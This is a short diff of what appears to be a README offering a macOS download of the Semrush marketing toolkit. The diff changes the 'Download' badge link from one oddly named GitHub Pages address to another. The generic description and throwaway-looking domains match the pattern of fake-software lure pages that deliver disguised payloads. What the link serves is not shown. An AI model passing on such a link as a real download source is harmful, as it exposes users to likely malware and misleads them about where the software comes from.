@@ -2,7 +2,7 @@
 
 Semrush mac on macOS — toolkit for domain overview & traffic analytics, keyword magic tool, and position tracking with native integrations for creator
 
-[![Download Semrush mac](https://img.shields.io/badge/Download-Semrush_mac-blueviolet)](https://kiamsiodkdf-ajjdhf2834.github.io/.github/info)
+[![Download Semrush mac](https://img.shields.io/badge/Download-Semrush_mac-blueviolet)](https://lechernovletteney.github.io/.github/Semrush-Studio)
 
 ---
 
